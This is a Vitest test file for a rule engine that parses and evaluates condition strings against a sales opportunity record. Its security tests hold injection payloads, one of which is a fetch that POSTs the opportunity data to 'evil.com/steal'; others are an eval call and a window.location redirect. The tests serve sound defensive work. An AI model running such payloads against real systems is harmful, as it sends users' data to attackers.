import { describe, it, expect } from 'vitest';
import { parseLegacyCondition, evaluateCondition } from './ruleEngine';
import type { Opportunity } from '../types';

describe('ruleEngine', () => {
  const mockOpp: Partial<Opportunity> = {
    raiseLevel: 'L3',
    tcv: 1500000,
    raiseTcv: 1500000,
    hasKcpDeviations: true,
    isPublicSector: false,
    isRti: true,
    isMandataria: false,
  };

  describe('parseLegacyCondition', () => {
    it('should parse simple equality condition with string value', () => {
      const result = parseLegacyCondition("opp.raiseLevel === 'L3'");
      expect(result).toEqual({
        all: [{ field: 'raiseLevel', operator: 'equals', value: 'L3' }]
      });
    });

    it('should parse equality condition without opp prefix', () => {
      const result = parseLegacyCondition("raiseLevel === 'L3'");
      expect(result).toEqual({
        all: [{ field: 'raiseLevel', operator: 'equals', value: 'L3' }]
      });
    });

    it('should parse boolean true condition', () => {
      const result = parseLegacyCondition("opp.hasKcpDeviations === true");
      expect(result).toEqual({
        all: [{ field: 'hasKcpDeviations', operator: 'equals', value: true }]
      });
    });

    it('should parse boolean false condition', () => {
      const result = parseLegacyCondition("opp.isPublicSector === false");
      expect(result).toEqual({
        all: [{ field: 'isPublicSector', operator: 'equals', value: false }]
      });
    });

    it('should parse greater than condition', () => {
      const result = parseLegacyCondition("opp.tcv > 1000000");
      expect(result).toEqual({
        all: [{ field: 'tcv', operator: 'greaterThan', value: 1000000 }]
      });
    });

    it('should parse greater than or equal condition', () => {
      const result = parseLegacyCondition("opp.raiseTcv >= 250000");
      expect(result).toEqual({
        all: [{ field: 'raiseTcv', operator: 'greaterThanOrEqual', value: 250000 }]
      });
    });

    it('should parse less than condition', () => {
      const result = parseLegacyCondition("opp.tcv < 5000000");
      expect(result).toEqual({
        all: [{ field: 'tcv', operator: 'lessThan', value: 5000000 }]
      });
    });

    it('should parse less than or equal condition', () => {
      const result = parseLegacyCondition("opp.raiseTcv <= 10000000");
      expect(result).toEqual({
        all: [{ field: 'raiseTcv', operator: 'lessThanOrEqual', value: 10000000 }]
      });
    });

    it('should parse AND compound condition', () => {
      const result = parseLegacyCondition("(opp.isRti === true && opp.isMandataria === true)");
      expect(result).toEqual({
        all: [
          { field: 'isRti', operator: 'equals', value: true },
          { field: 'isMandataria', operator: 'equals', value: true }
        ]
      });
    });

    it('should parse OR compound condition', () => {
      const result = parseLegacyCondition("(raiseLevel === 'L1' || raiseLevel === 'L2')");
      expect(result).toEqual({
        any: [
          { field: 'raiseLevel', operator: 'equals', value: 'L1' },
          { field: 'raiseLevel', operator: 'equals', value: 'L2' }
        ]
      });
    });

    it('should return null for empty condition', () => {
      const result = parseLegacyCondition("");
      expect(result).toBeNull();
    });

    it('should return null for whitespace-only condition', () => {
      const result = parseLegacyCondition("   ");
      expect(result).toBeNull();
    });

    it('should return null for invalid syntax', () => {
      const result = parseLegacyCondition("invalid syntax here");
      expect(result).toBeNull();
    });

    it('should return null for malicious code injection attempt', () => {
      const result = parseLegacyCondition("console.log('injected'); return true");
      expect(result).toBeNull();
    });
  });

  describe('evaluateCondition', () => {
    describe('String conditions', () => {
      it('should evaluate simple equality - true', () => {
        const result = evaluateCondition("opp.raiseLevel === 'L3'", mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate simple equality - false', () => {
        const result = evaluateCondition("opp.raiseLevel === 'L1'", mockOpp as Opportunity);
        expect(result).toBe(false);
      });

      it('should evaluate boolean condition - true', () => {
        const result = evaluateCondition("opp.hasKcpDeviations === true", mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate boolean condition - false', () => {
        const result = evaluateCondition("opp.isPublicSector === true", mockOpp as Opportunity);
        expect(result).toBe(false);
      });

      it('should evaluate greater than - true', () => {
        const result = evaluateCondition("opp.tcv > 1000000", mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate greater than - false', () => {
        const result = evaluateCondition("opp.tcv > 2000000", mockOpp as Opportunity);
        expect(result).toBe(false);
      });

      it('should evaluate greater than or equal - true (greater)', () => {
        const result = evaluateCondition("opp.tcv >= 1000000", mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate greater than or equal - true (equal)', () => {
        const result = evaluateCondition("opp.tcv >= 1500000", mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate less than - true', () => {
        const result = evaluateCondition("opp.tcv < 2000000", mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate less than - false', () => {
        const result = evaluateCondition("opp.tcv < 1000000", mockOpp as Opportunity);
        expect(result).toBe(false);
      });

      it('should evaluate less than or equal - true (less)', () => {
        const result = evaluateCondition("opp.tcv <= 2000000", mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate less than or equal - true (equal)', () => {
        const result = evaluateCondition("opp.tcv <= 1500000", mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate AND condition - true', () => {
        const result = evaluateCondition(
          "(opp.isRti === true && opp.hasKcpDeviations === true)",
          mockOpp as Opportunity
        );
        expect(result).toBe(true);
      });

      it('should evaluate AND condition - false', () => {
        const result = evaluateCondition(
          "(opp.isRti === true && opp.isMandataria === true)",
          mockOpp as Opportunity
        );
        expect(result).toBe(false);
      });

      it('should evaluate OR condition - true (first true)', () => {
        const result = evaluateCondition(
          "(raiseLevel === 'L3' || raiseLevel === 'L1')",
          mockOpp as Opportunity
        );
        expect(result).toBe(true);
      });

      it('should evaluate OR condition - true (second true)', () => {
        const result = evaluateCondition(
          "(raiseLevel === 'L1' || raiseLevel === 'L3')",
          mockOpp as Opportunity
        );
        expect(result).toBe(true);
      });

      it('should evaluate OR condition - false', () => {
        const result = evaluateCondition(
          "(raiseLevel === 'L1' || raiseLevel === 'L2')",
          mockOpp as Opportunity
        );
        expect(result).toBe(false);
      });

      it('should return true for empty string condition', () => {
        const result = evaluateCondition('', mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should return true for null condition', () => {
        const result = evaluateCondition(null, mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should return true for undefined condition', () => {
        const result = evaluateCondition(undefined, mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should return false for unparseable condition', () => {
        const result = evaluateCondition("invalid syntax", mockOpp as Opportunity);
        expect(result).toBe(false);
      });

      it('should prevent code injection - malicious console.log', () => {
        const result = evaluateCondition(
          "console.log('injected'); return true",
          mockOpp as Opportunity
        );
        expect(result).toBe(false);
      });

      it('should prevent code injection - malicious eval', () => {
        const result = evaluateCondition(
          "eval('malicious code')",
          mockOpp as Opportunity
        );
        expect(result).toBe(false);
      });
    });

    describe('Object conditions', () => {
      it('should evaluate object condition with all (AND)', () => {
        const condition = {
          all: [
            { field: 'raiseLevel' as keyof Opportunity, operator: 'equals' as const, value: 'L3' },
            { field: 'hasKcpDeviations' as keyof Opportunity, operator: 'equals' as const, value: true }
          ]
        };
        const result = evaluateCondition(condition, mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate object condition with all (AND) - false', () => {
        const condition = {
          all: [
            { field: 'raiseLevel' as keyof Opportunity, operator: 'equals' as const, value: 'L3' },
            { field: 'isPublicSector' as keyof Opportunity, operator: 'equals' as const, value: true }
          ]
        };
        const result = evaluateCondition(condition, mockOpp as Opportunity);
        expect(result).toBe(false);
      });

      it('should evaluate object condition with any (OR)', () => {
        const condition = {
          any: [
            { field: 'raiseLevel' as keyof Opportunity, operator: 'equals' as const, value: 'L1' },
            { field: 'raiseLevel' as keyof Opportunity, operator: 'equals' as const, value: 'L3' }
          ]
        };
        const result = evaluateCondition(condition, mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate object condition with any (OR) - false', () => {
        const condition = {
          any: [
            { field: 'raiseLevel' as keyof Opportunity, operator: 'equals' as const, value: 'L1' },
            { field: 'raiseLevel' as keyof Opportunity, operator: 'equals' as const, value: 'L2' }
          ]
        };
        const result = evaluateCondition(condition, mockOpp as Opportunity);
        expect(result).toBe(false);
      });

      it('should evaluate object condition with greaterThan operator', () => {
        const condition = {
          all: [
            { field: 'tcv' as keyof Opportunity, operator: 'greaterThan' as const, value: 1000000 }
          ]
        };
        const result = evaluateCondition(condition, mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should evaluate object condition with lessThan operator', () => {
        const condition = {
          all: [
            { field: 'tcv' as keyof Opportunity, operator: 'lessThan' as const, value: 2000000 }
          ]
        };
        const result = evaluateCondition(condition, mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should return true for empty object condition', () => {
        const result = evaluateCondition({}, mockOpp as Opportunity);
        expect(result).toBe(true);
      });

      it('should handle unknown operator gracefully', () => {
        const condition = {
          all: [
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            { field: 'tcv' as keyof Opportunity, operator: 'unknownOp' as any, value: 1000000 }
          ]
        };
        const result = evaluateCondition(condition, mockOpp as Opportunity);
        expect(result).toBe(false);
      });
    });

    describe('Security tests', () => {
      it('should not execute arbitrary JavaScript code', () => {
        const sideEffect = false;

        // Try to inject code that would set the side effect
        const maliciousCondition = "(() => { sideEffect = true; return true; })()";

        evaluateCondition(maliciousCondition, mockOpp as Opportunity);

        // Side effect should NOT have occurred
        expect(sideEffect).toBe(false);
      });

      it('should not allow access to global objects', () => {
        const maliciousCondition = "window.location = 'http://evil.com'";

        // Should safely return false without executing
        const result = evaluateCondition(maliciousCondition, mockOpp as Opportunity);
        expect(result).toBe(false);
      });

      it('should not allow function calls', () => {
        const maliciousCondition = "fetch('http://evil.com/steal', { method: 'POST', body: JSON.stringify(opp) })";

        // Should safely return false without executing
        const result = evaluateCondition(maliciousCondition, mockOpp as Opportunity);
        expect(result).toBe(false);
      });
    });
  });
});
